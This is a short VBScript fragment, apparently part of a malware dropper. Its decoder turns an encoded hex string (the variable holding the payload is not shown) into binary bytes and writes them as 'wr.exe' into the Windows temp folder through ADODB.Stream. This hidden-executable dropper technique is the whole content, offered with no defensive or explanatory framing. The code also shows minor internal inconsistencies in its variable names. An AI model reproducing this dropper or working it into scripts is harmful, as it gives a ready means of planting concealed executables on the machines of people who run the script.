W CreateObject("Scripting.FileSystemObject").GetSpecialFolder(2) & "\wr.exe", R(d)

Function R(t)
  
  Dim Arr()
  For i=0 To Len(t)-1 Step 2
      Redim Preserve Ar(S)
   
      FB=Mid(t,i+1,1)
      SB=Mid(t,i+2,1)
      HX=FB & SB
            
      If FB="x" Then
        NB=Mid(t,i+3,1)
        L=H(SB & NB)
        
        For j=0 To L
          Redim Preserve Ar(S+(j*2)+1)
          Ar(S+j)=0
          Ar(S+j+1)=0
        Next
            
        i=i+1
        S=S+L
        
      Else
        If Len(HX)>0 Then
          Ar(S)=H(HX)
        End If
        S=S+1
        
      End If     
      
       
  Next
  Redim Preserve Ar(S-2)
  
  R=Ar

End Function

Function H(HX)
  H=CLng("&H" & HX)
End Function

Sub W(FN, Buf)    
    Dim aBuf 
    Size = UBound(Buf): ReDim aBuf(Size\2) 
    For I = 0 To Size - 1 Step 2  
        aBuf(I\2)=ChrW(Buf(I+1)*256+Buf(I))  
    Next  
    If I=Size Then
      aBuf(I\2)=ChrW(Buf(I))
    End If   
    aBuf=Join(aBuf,"")  
    Set bS=CreateObject("ADODB.Stream")  
    bS.Type=1:bS.Open  
    With CreateObject("ADODB.Stream")  
        .Type=2:.Open:.WriteText aBuf  
        .Position=2:.CopyTo bS:.Close  
    End With
    bS.SaveToFile FN,2:bS.Close  
    Set bS=Nothing  
End Sub
